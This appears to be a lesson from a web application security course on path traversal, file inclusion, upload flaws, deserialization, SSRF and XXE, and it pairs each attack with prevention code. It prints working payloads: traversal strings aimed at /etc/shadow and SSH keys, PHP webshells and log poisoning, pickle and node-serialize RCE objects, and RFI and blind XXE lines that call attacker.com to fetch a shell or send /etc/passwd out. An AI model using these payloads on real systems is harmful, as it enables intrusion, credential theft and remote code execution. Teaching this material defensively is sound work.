---
tags:
  - security:security
  - security:web-security
  - security:penetration-testing
  - security:owasp
level: advanced
category: security
audience:
  - audiences:developers
  - audiences:security-professionals

---

# File Path Manipulation & Deserialization Attacks

## Abusing File Operations and Object Handling

---

## Path Traversal (Directory Traversal)

Path traversal allows attackers to read files outside the intended directory by manipulating file path parameters.

```misc
Normal request:
  GET /download?file=report.pdf
  Server reads: /var/www/uploads/report.pdf

Attack request:
  GET /download?file=../../../etc/passwd
  Server reads: /var/www/uploads/../../../etc/passwd
  Resolves to: /etc/passwd

The ../ sequence moves UP one directory level
```

---

## Path Traversal Payloads

```bash
# Linux targets
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../home/user/.ssh/id_rsa
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline

# Windows targets
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
..\..\..\users\administrator\desktop\flag.txt

# Application-specific files
../../../var/www/html/config.php
../../../var/www/html/.env
../../../opt/app/settings.py
../../../app/config/database.yml
```

---

## Path Traversal Bypass Techniques

```bash
# Bypass: Filter strips ../
....//....//....//etc/passwd      # Double dots
..../....//etc/passwd             # Extra dots
..%2f..%2f..%2fetc/passwd         # URL-encoded /
..%252f..%252f..%252fetc/passwd   # Double URL-encoded
..%c0%af..%c0%af..%c0%afetc/passwd  # Overlong UTF-8

# Bypass: Filter requires file extension
../../../etc/passwd%00.jpg         # Null byte (older systems)
../../../etc/passwd#.jpg           # Fragment
../../../etc/passwd?.jpg           # Query string

# Bypass: Absolute path filter
/etc/passwd                        # Direct absolute path
file:///etc/passwd                 # File URI scheme

# Bypass: Starts with expected directory
/var/www/uploads/../../../etc/passwd
uploads/../../../etc/passwd
```

---

## Local File Inclusion (LFI)

```php
<!-- VULNERABLE PHP code -->
<?php
  $page = $_GET['page'];
  include($page . '.php');
?>

<!-- Normal: page=home -> includes home.php -->
<!-- Attack: page=../../../etc/passwd%00 -->
<!-- Includes /etc/passwd (null byte truncates .php) -->

<!-- LFI to RCE via log poisoning -->
<!-- Step 1: Inject PHP in User-Agent (logged to access.log) -->
User-Agent: <?php system($_GET['cmd']); ?>

<!-- Step 2: Include the log file -->
?page=../../../var/log/apache2/access.log%00&cmd=whoami

<!-- LFI to RCE via PHP wrappers -->
?page=php://filter/convert.base64-encode/resource=config
<!-- Returns base64-encoded source code of config.php -->

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
<!-- Executes: <?php system($_GET['cmd']);?> -->
```

---

## Remote File Inclusion (RFI)

```php
<!-- VULNERABLE PHP code (allow_url_include=On) -->
<?php
  $page = $_GET['page'];
  include($page);
?>

<!-- Attack: Include attacker's malicious PHP file -->
?page=https://attacker.com/shell.php

<!-- Attacker hosts shell.php containing: -->
<?php system($_GET['cmd']); ?>

<!-- Access: target.com/?page=https://attacker.com/shell.php&cmd=whoami -->

<!-- Prevention: -->
<!-- php.ini: allow_url_include = Off -->
<!-- Whitelist allowed include files -->
```

---

## File Upload Vulnerabilities

```php
// VULNERABLE: No file type validation
move_uploaded_file($_FILES['file']['tmp_name'],
    '/var/www/uploads/' . $_FILES['file']['name']);

// Attacks:
// 1. Upload PHP webshell
//    Filename: shell.php
//    Content: <?php system($_GET['cmd']); ?>
//    Access: /uploads/shell.php?cmd=whoami

// 2. Double extension bypass
//    Filename: shell.php.jpg  (Apache may still execute .php)

// 3. Content-Type bypass
//    Change Content-Type to image/jpeg while uploading .php

// 4. Magic bytes bypass
//    GIF89a<?php system($_GET['cmd']); ?>
//    File starts with valid GIF header

// 5. .htaccess upload
//    Upload: AddType application/x-httpd-php .jpg
//    Then upload shell.jpg (executed as PHP)
```

---

## Preventing File Path Attacks

```python
import os

def safe_file_access(user_filename):
    # 1. Define allowed base directory
    UPLOAD_DIR = '/var/www/uploads'

    # 2. Get basename (strip directory components)
    safe_name = os.path.basename(user_filename)

    # 3. Construct full path
    full_path = os.path.join(UPLOAD_DIR, safe_name)

    # 4. Resolve to absolute path and verify
    real_path = os.path.realpath(full_path)

    # 5. Check it's still within allowed directory
    if not real_path.startswith(UPLOAD_DIR):
        raise SecurityError("Path traversal detected!")

    # 6. Check file exists
    if not os.path.isfile(real_path):
        raise FileNotFoundError("File not found")

    return real_path
```

---

## Secure File Upload Implementation

```python
import os
import uuid
import magic  # python-magic library

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
ALLOWED_MIMES = {'image/png', 'image/jpeg', 'image/gif', 'application/pdf'}
MAX_SIZE = 5 * 1024 * 1024  # 5MB
UPLOAD_DIR = '/var/www/uploads'

def secure_upload(file):
    # 1. Check file size
    if file.content_length > MAX_SIZE:
        raise ValueError("File too large")

    # 2. Check extension (whitelist)
    ext = file.filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("Invalid file type")

    # 3. Check MIME type (magic bytes)
    mime = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIMES:
        raise ValueError("Invalid file content")

    # 4. Generate random filename (prevent path traversal)
    safe_name = f"{uuid.uuid4().hex}.{ext}"

    # 5. Save outside web root if possible
    save_path = os.path.join(UPLOAD_DIR, safe_name)
    file.save(save_path)

    return safe_name
```

---

## Deserialization Attacks - Overview

![deserialization_attacks_overview](svg/courses/security/web-application-hacking/15_file_path_and_deserialization/deserialization_attacks_overview.svg)

---

## PHP Deserialization

```php
// PHP uses serialize() and unserialize()

// Vulnerable class with __wakeup magic method
class User {
    public $name;
    public $isAdmin = false;

    public function __wakeup() {
        // Called when object is deserialized
        if ($this->isAdmin) {
            $this->grantAdminAccess();
        }
    }
}

// VULNERABLE: Deserializing user cookie
$user = unserialize($_COOKIE['user']);

// Attack payload (serialized User with isAdmin=true):
O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
// Object type "User", 2 properties, isAdmin = true
```

---

## Java Deserialization

```java
// Java serialization is extremely dangerous
// Many "gadget chains" in common libraries

// VULNERABLE code
ObjectInputStream ois = new ObjectInputStream(
    new ByteArrayInputStream(userInput));
Object obj = ois.readObject(); // DANGEROUS!

// Attacker uses ysoserial to generate payloads:
// java -jar ysoserial.jar CommonsCollections1 "whoami"
// Generates a serialized Java object that executes "whoami"
// when deserialized

// Common vulnerable libraries (gadget chains):
// - Apache Commons Collections
// - Spring Framework
// - Apache Commons BeanUtils
// - JDK7u21

// Detection: Look for Java serialized data
// Starts with: AC ED 00 05 (hex) or rO0AB (base64)
```

---

## Python Pickle Deserialization

```python
import pickle
import os

# VULNERABLE: Deserializing untrusted pickle data
data = request.get_data()
obj = pickle.loads(data)  # DANGEROUS!

# Attack: Craft malicious pickle
class Exploit:
    def __reduce__(self):
        # __reduce__ is called during unpickling
        return (os.system, ('whoami',))

# Generate payload
payload = pickle.dumps(Exploit())
# Send this payload to the vulnerable endpoint

# Result: Server executes 'whoami'

# NEVER unpickle untrusted data!
# Use JSON or other safe serialization formats instead
```

---

## Node.js Deserialization

```javascript
// node-serialize library is vulnerable
const serialize = require('node-serialize');

// VULNERABLE
const obj = serialize.unserialize(userInput);

// Attack payload using IIFE (Immediately Invoked Function Expression)
const payload = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error, stdout) {/* ... */})}()"
};

// The trailing () causes immediate execution on deserialization

// Prevention:
// - Don't deserialize untrusted data
// - Use JSON.parse() instead (safe)
// - If you must: validate and sanitize before deserializing
// - Use allowlists for acceptable object types
```

---

## Preventing Deserialization Attacks

```misc
1. NEVER deserialize untrusted data
   - Use JSON, XML, or other simple data formats
   - JSON.parse() is safe (no code execution)

2. If deserialization is required:
   - Implement integrity checks (HMAC signatures)
   - Use allowlists for acceptable classes
   - Isolate deserialization in sandboxed environments
   - Monitor for known gadget chain patterns

3. Language-specific mitigations:
   - Java: Use ObjectInputFilter (JDK 9+)
   - PHP: Avoid unserialize() with user data
   - Python: Use json.loads() instead of pickle.loads()
   - .NET: Avoid BinaryFormatter, use DataContractSerializer

4. Dependencies:
   - Keep libraries updated
   - Remove unnecessary gadget chain libraries
```

---

## Server-Side Request Forgery (SSRF)

```python
# SSRF: Trick the server into making requests to internal resources

# VULNERABLE: Fetching user-supplied URL
import requests

url = request.form['url']
response = requests.get(url)  # Server fetches this URL
return response.text

# Attack: Access internal services
url=http://localhost:8080/admin          # Internal admin panel
url=http://169.254.169.254/latest/meta-data/  # AWS metadata
url=http://10.0.0.1:6379/               # Internal Redis
url=file:///etc/passwd                   # Local file read

# Cloud metadata endpoints:
# AWS:   http://169.254.169.254/latest/meta-data/
# GCP:   http://metadata.google.internal/
# Azure: http://169.254.169.254/metadata/instance
```

---

## SSRF Prevention

```python
import ipaddress
from urllib.parse import urlparse

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0']
BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / cloud metadata
    ipaddress.ip_network('127.0.0.0/8'),
]

def is_safe_url(url):
    parsed = urlparse(url)

    if parsed.scheme not in ('http', 'https'):
        return False

    if parsed.hostname in BLOCKED_HOSTS:
        return False

    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False
    except ValueError:
        pass  # Not an IP, resolve DNS and check again

    return True
```

---

## XML External Entity (XXE) Attacks

```xml
<!-- XXE exploits XML parsers that process external entities -->

<!-- Basic XXE - Read local file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>

<!-- Blind XXE - Out-of-band data exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- evil.dtd on attacker's server: -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

---

## XXE Prevention

```python
# Python - defusedxml library
import defusedxml.ElementTree as ET

# This is SAFE - disables external entities
tree = ET.parse('input.xml')

# Standard library is VULNERABLE by default:
# import xml.etree.ElementTree as ET  # DON'T use for untrusted XML

# Java - disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

# PHP - disable external entities
libxml_disable_entity_loader(true);

# Best practice: Use JSON instead of XML when possible
```

---

## SSRF Bypass Techniques

```misc
# Bypassing SSRF blocklist filters:

# IP address variations for 127.0.0.1
http://0177.0.0.1/          # Octal
http://2130706433/           # Decimal
http://0x7f000001/           # Hexadecimal
http://127.1/                # Shortened
http://[::1]/                # IPv6 loopback
http://0/                    # Zero
http://127.0.0.1.nip.io/    # DNS rebinding service

# DNS rebinding attack
# Register domain that alternates between
# attacker IP and 127.0.0.1
# First resolution: passes validation (public IP)
# Second resolution: hits internal service (127.0.0.1)

# Redirect-based bypass
# If server follows redirects:
http://attacker.com/redirect?url=http://127.0.0.1/admin
# Attacker's server returns 302 to internal URL

# URL parsing differences
http://target.com@127.0.0.1/     # Username as hostname
http://127.0.0.1#@target.com/    # Fragment confusion
```

---

## Lab: DVWA File Inclusion

```misc
Low security:
  ?page=../../../etc/passwd
  ?page=http://attacker.com/shell.php  (if RFI enabled)

Medium security:
  Strips ../ and http://
  Bypass: ....//....//etc/passwd
  Bypass: hthttp://tp://attacker.com/shell.php

High security:
  Must start with "file"
  ?page=file:///etc/passwd
  ?page=file/../../../etc/passwd

Impossible:
  Whitelist of allowed pages only
```

---

## Summary

- Path traversal reads arbitrary files via `../` sequences
- File inclusion can lead to remote code execution
- File uploads must validate type, size, and content
- Deserialization of untrusted data is extremely dangerous
- `SSRF` exploits server-side request capabilities
- Use allowlists, not blocklists, for file operations
- Never deserialize untrusted input - use `JSON` instead

> Next: Application Logic Flaws
